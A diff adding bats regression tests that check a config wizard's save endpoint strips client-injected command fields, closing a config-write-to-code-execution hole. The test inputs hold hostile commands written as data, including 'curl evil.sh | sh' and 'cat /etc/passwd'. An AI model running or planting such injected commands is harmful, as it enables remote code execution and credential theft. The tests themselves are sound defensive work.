@@ -723,6 +723,70 @@ JSON
 }
 
 # ----------------------------------------------------------------------------
+# #125: config.json is a trust boundary. A wizard client must not be able to
+# plant an eval-bearing field (password_cmd / *_cmd / command templates) via a
+# config-save, or the next host op runs it (config-write -> RCE). On save these
+# fields may come only from the trusted on-disk config, never the client.
+# ----------------------------------------------------------------------------
+
+@test "POST /save drops a client-injected hosts.*.password_cmd (no trusted value)" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u" } } }
+JSON
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","password_cmd":"touch /tmp/pwned"}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"\"ok\":true"* ]]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" != *"password_cmd"* ]]
+  [[ "$output" != *"/tmp/pwned"* ]]
+}
+
+@test "POST /save cannot override an existing (CLI-set) password_cmd" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u", "password_cmd": "op read op://vault/prod/pw" } } }
+JSON
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","password_cmd":"curl evil.sh | sh"}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  # Trusted value preserved, injected one rejected.
+  [[ "$output" == *"op read op://vault/prod/pw"* ]]
+  [[ "$output" != *"evil.sh"* ]]
+}
+
+@test "POST /save restores a CLI-set password_cmd the form omitted (no data loss)" {
+  cat > "$WIZ_SCRATCH/config.json" <<'JSON'
+{ "hosts": { "prod": { "type": "postgres", "user": "u", "password_cmd": "op read op://vault/prod/pw" } } }
+JSON
+  # Form re-saves the host without password_cmd (the form doesn't model it).
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{"prod":{"type":"postgres","user":"u","port":5432}},"defaults":{}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" == *"op read op://vault/prod/pw"* ]]
+  [[ "$output" == *"5432"* ]]
+}
+
+@test "POST /save drops injected notification + storage eval fields" {
+  printf '{ "hosts": {} }' > "$WIZ_SCRATCH/config.json"
+  run curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"hosts":{},"defaults":{},"notifications":{"command":{"on_success":"touch /tmp/x"},"slack":{"webhook_url_cmd":"id"}},"storage":{"type":"s3","s3":{"bucket":"b","secret_key_cmd":"cat /etc/passwd"}},"storages":{"r2":{"s3":{"secret_key_cmd":"whoami"}}}}' \
+    "$(api /save)"
+  [ "$status" -eq 0 ]
+  run cat "$WIZ_SCRATCH/config.json"
+  [[ "$output" != *"on_success"* ]]
+  [[ "$output" != *"webhook_url_cmd"* ]]
+  [[ "$output" != *"secret_key_cmd"* ]]
+  [[ "$output" != *"/etc/passwd"* ]]
+  # Non-eval sibling fields in the same blocks still persist.
+  [[ "$output" == *"\"bucket\": \"b\""* ]]
+}
+
+# ----------------------------------------------------------------------------
 # /api/config-save  — Save without exiting (Save-without-exit UX split)
 # ----------------------------------------------------------------------------
 
